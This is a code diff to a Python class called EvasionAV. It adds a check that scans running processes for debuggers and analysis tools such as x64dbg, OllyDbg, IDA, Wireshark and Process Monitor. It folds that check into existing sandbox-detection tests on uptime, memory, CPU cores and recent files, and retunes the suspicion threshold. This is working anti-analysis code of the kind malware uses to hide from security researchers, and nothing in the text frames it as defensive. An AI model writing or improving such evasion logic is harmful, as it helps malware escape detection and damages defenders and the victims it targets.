@@ -23,7 +23,8 @@ class EvasionAV:
             self._check_system_uptime,
             self._check_memory_size,
             self._check_cpu_cores,
-            self._check_recent_files
+            self._check_recent_files,
+            self._check_security_tools
         ]
         sospechoso = 0
         for check in checks:
@@ -34,7 +35,7 @@ class EvasionAV:
             except:
                 pass
             time.sleep(0.05)
-        if sospechoso >= 3:
+        if sospechoso >= 4:
             self.es_seguro = False
             return False
         return True
@@ -138,6 +139,21 @@ class EvasionAV:
             if os.path.exists(downloads):
                 files = [f for f in os.listdir(downloads) if os.path.isfile(os.path.join(downloads, f))]
                 return len(files) < 3
+        except:
+            pass
+        return False
+    
+    def _check_security_tools(self):
+        try:
+            import psutil
+            suspicious_processes = [
+                'procmon', 'processhacker', 'x64dbg', 'ollydbg', 'ida',
+                'wireshark', 'fiddler', 'tcpview', 'autoruns', 'procexp'
+            ]
+            for proc in psutil.process_iter(['name']):
+                proc_name = proc.info['name'].lower()
+                if any(sus in proc_name for sus in suspicious_processes):
+                    return True
         except:
             pass
         return False
